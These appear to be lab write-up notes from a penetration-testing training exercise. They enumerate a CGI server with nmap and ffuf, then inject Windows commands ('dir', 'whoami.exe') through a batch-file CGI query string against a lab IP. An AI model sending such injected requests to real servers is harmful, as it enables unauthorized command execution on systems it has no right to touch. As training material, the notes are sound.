The CGI script can use command line arguments to switch between these actions. For instance, the script can be called with the following URL:

```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

If the user wants to search by author, they can use a similar URL:

```http
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```
## Enumeration
#### Nmap - Open Ports

```shell
3kjS@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open
```
![](Screenshot%202026-08-02%20at%2011.22.18.png)
#### Finding a CGI script

One way to uncover web server content is by utilising the `ffuf` web enumeration tool along with the `dirb common.txt` wordlist.
#### Fuzzing Extentions - .CMD

```shell
3kjS@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
#### Fuzzing Extentions - .BAT

```shell
3kjS@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
![](Screenshot%202026-08-02%20at%2011.23.15.png)

Navigating to the discovered URL at `http://10.129.204.227:8080/cgi/welcome.bat` returns a message:

```txt
Welcome to CGI, this section is not functional yet. Please return to home page.
```
## Exploitation

```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

Retrieve a list of environmental variables by calling the `set` command:
![](Screenshot%202026-08-02%20at%2011.24.30.png)

From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
